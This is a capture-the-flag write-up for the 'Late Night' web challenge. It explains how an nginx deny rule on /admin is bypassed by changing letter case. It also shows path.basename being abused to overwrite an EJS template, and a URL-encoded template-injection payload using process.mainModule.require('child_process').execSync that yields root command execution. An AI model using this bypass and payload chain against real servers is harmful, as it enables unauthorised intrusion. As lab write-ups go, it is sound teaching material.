Assalam-o-Alaikum!

This is the writeup for CodeCon-CUI'24 Web Challenge named "Late Night." Unfortunately, I didn't solve it during the competition because I was unable to bypass a very simple restriction on the `/admin` endpoint. My mind was so stuck at the time that I couldn't figure out how to bypass that restriction. Later, when I realized the solution, I laughed at myself so much. Hahaha!

Now, let's begin.

# Challenge Description

> IDK what I was doing this late at night :-( 

We are provided with a zip file containing the following files:

- `app.py`
- `Dockerfile`
- `nginx.conf`
- `package.json`
- `package-lock.json`
- `supervisord.conf`

### app.py
```
const express = require('express');
const process = require('process');
const path = require('path');
const ejs = require('ejs');
const fs = require('fs');
const app = express();
process.chdir("/tmp");

fs.writeFileSync('index.ejs', `
<html>
<body>
    <% if ( message != null ) { %>
        <input type="text" placeholder="<%= message %>">
    <% } else { %>
        <input type="text" placeholder="Message...">
    <% } %>
</body>
</html>
`);

class Message {
    constructor(to, msg) {
        this.to = to;
        this.msg = msg;
        this.file = null;
    }

    send() {
        console.log(`Message sent to: ${this.to}`);
    }

    makeBackup() {
        this.file = path.basename(`${Date.now()}_${this.to}`);
        fs.writeFileSync(this.file, this.msg);
    }
}

app.set('view engine', 'ejs');
app.set('views', '/tmp');

app.get('/admin', (req, res) => {
    let to = req.query.to || "pro@chc.com";
    let msg = req.query.msg || "Hello, I am a noob, please teach me how to RCE this server";
    var message = new Message(to, msg);
    message.makeBackup();
    res.render('index.ejs', { message: message.msg });
});

const port = 3000;
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
```

This is a simple web application that has only one endpoint, `/admin`, which takes two parameters: `to` and `msg`. If not provided, it assigns default values to them. After that, a `message` class constructor is initialized with the values of `to` and `msg`. Then, the `makeBackup()` method inside the `message` class is called.

### `makeBackup()`
For functionality of makeBackup():
```
makeBackup() {
        this.file = path.basename(`${Date.now()}_${this.to}`);
        fs.writeFileSync(this.file, this.msg);
    }
```

The functionality is quite simple. The value of the `to` parameter is concatenated with the current date and time, and then it is assigned as the file name using `path.basename()`. This function can be exploited, as we will see later. Now, let's continue to understand the `makeBackup()` functionality. After assigning a file name, it creates a file with that name using `fs.writeFileSync()`, and the content of the file is set to the value of the `msg` parameter.

Right after `makeBackup()` is called, `index.ejs` is rendered with the following content, and the value of `msg` is set as the placeholder of the input field:
```
<html>
<body>
    <% if ( message != null ) { %>
        <input type="text" placeholder="<%= message %>">
    <% } else { %>
        <input type="text" placeholder="Message...">
    <% } %>
</body>
</html>
```
Remember, `index.ejs` is in the same directory where new files are created, i.e., `/tmp`.

### Dockerfile
```
FROM node:18 as node-build
WORKDIR /app

COPY app.js ./
COPY package*.json ./
RUN npm install
COPY . .

FROM nginx:alpine
RUN apk --no-cache add curl supervisor
COPY ./nginx.conf /etc/nginx/nginx.conf

COPY --from=node-build /app /app

COPY ./supervisord.conf /etc/supervisord.conf
COPY ./docker-entrypoint.sh /docker-entrypoint.sh


EXPOSE 80
ENTRYPOINT ["/docker-entrypoint.sh"]
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
````

Nothing significant appears in the Dockerfile, as there is no `flag.txt` being copied or anything similar. This indicates that we need to obtain `Remote Code Execution (RCE)`.

### nginx.conf
```
events {
    worker_connections 1024;
}

http {
    server {
        listen 80;

        location / {
            proxy_pass http://localhost:3000;            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }

        location = /admin {
            deny all;
        }

        location = /admin/ {
            deny all;
        }
    }
}
```
Thereâ€™s a restriction on accessing `/admin` and `/admin/`. This is hilarious to me because I couldnâ€™t bypass such a simple restriction. The funny part is that I tried almost every payload available on Google to bypass restrictions like these, which typically include null bytes and other bypass techniques, but I failed.

Later, when I discovered the solution, I couldnâ€™t stop laughing. You can bypass the restriction simply by capitalizing any letter in the path, like `/Admin` or `/AdmiN`, and it works!

I know the solution, but why didnâ€™t it come to my mind at that time??? Haaaaaaaah!ðŸ˜„

Let's get back to it now. Let's talk about a vulnerability that could be exploited: the `path.basename()` method. First, let's understand how it works.

The `path.basename()` method returns the last portion of a path, similar to the Unix basename command. Trailing directory separators are ignored.

For Example:
```
path.basename('/foo/bar/baz/asdf/quux.html');
// Returns: 'quux.html'
```

Yes! What can we do? We can overwrite `index.ejs` with our own content because of this vulnerability. We will set `to` parameter to `/index.js`, which will create file `index.ejs` and overwrite current `index.ejs`. Weâ€™ll inject malicious code into `index.ejs` through `msg` parameter, as it is being rendered, and attempt to get `Remote Code Execution (RCE)`. Letâ€™s start working on it nowwwww!

What should our payload be? After doing some research, I found out about the `child_process` module in Node.js. This module allows us to create and control child processes, enabling us to `execute` system commands, `run scripts`, and perform other operations outside the main Node.js process.

Lets create our payload:
```
<%- require('child_process').exec('id') %>
```

URL encode it:
```
%3C%25-%20require%28%27child_process%27%29.exec%28%27id%27%29%20%25%3E
```

Then, send the payload like this:
```
/Admin?to=/index.ejs&msg=%3C%25-%20require%28%27child_process%27%29.exec%28%27id%27%29%20%25%3E
```

This should have allowed us to inject and execute the malicious code to get RCE.

However, I encountered the following error:

```
ReferenceError: /tmp/index.ejs:1
 >> 1| <%- require('child_process').exec('id') %>

require is not defined
    at eval ("/tmp/index.ejs":10:7)

```
The error occurs because `require` is not available in the EJS template context. EJS templates run in the browser or within a restricted context, which does not have access to Node.js modules like `child_process`. This is a security feature to prevent running potentially dangerous server-side code in the template.

Hmmmm! Letâ€™s do more research, and only research. I found a method to use `child_process`. We can do it using `process.mainModule`. It refers to the entry point of the Node.js application, which is the main module that was first loaded when the application started. This module retains access to the original `require` function.

By using `process.mainModule.require`, we're essentially bypassing any restrictions placed on the `require` function in the template rendering context. This gives us access to core Node.js modules, such as `child_process`, which were previously inaccessible.

```
<%- process.mainModule.require('child_process').execSync('id').toString() %>
```
After Encoding:
```
%3C%25-%20process.mainModule.require%28%27child_process%27%29.execSync%28%27id%27%29.toString%28%29%20%25%3E
```

Final Payload like this:
```
/Admin?to=/index.ejs&msg=%3C%25-%20process.mainModule.require%28%27child_process%27%29.execSync%28%27id%27%29.toString%28%29%20%25%3E
```

Finally! Got RCE.
```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
Next, you can find the flag and read it by running terminal commands like `cd`, `ls`, `cat`.
